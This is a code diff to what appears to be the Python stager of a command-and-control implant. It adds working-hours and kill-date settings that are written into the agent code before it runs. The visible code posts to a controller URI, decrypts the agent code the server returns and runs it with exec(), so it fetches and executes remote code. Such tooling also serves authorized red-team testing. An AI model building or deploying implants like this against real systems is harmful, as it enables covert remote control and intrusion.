@@ -799,6 +799,8 @@ sessionID = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ 
 # server configuration information
 stagingKey = "REPLACE_STAGING_KEY"
 profile = 'REPLACE_PROFILE'
+WorkingHours = 'SET_WORKINGHOURS'
+KillDate = 'SET_KILLDATE'
 
 parts = profile.split('|')
 taskURIs = parts[0].split(',')
@@ -863,4 +865,6 @@ response = post_message(postURI, routingPacket)
 
 # step 6 -> server sends HMAC(AES)
 agent = aes_decrypt_and_verify(key, response)
+agent = agent.replace('REPLACE_WORKINGHOURS', WorkingHours)
+agent = agent.replace('REPLACE_KILLDATE', KillDate)
 exec(agent)
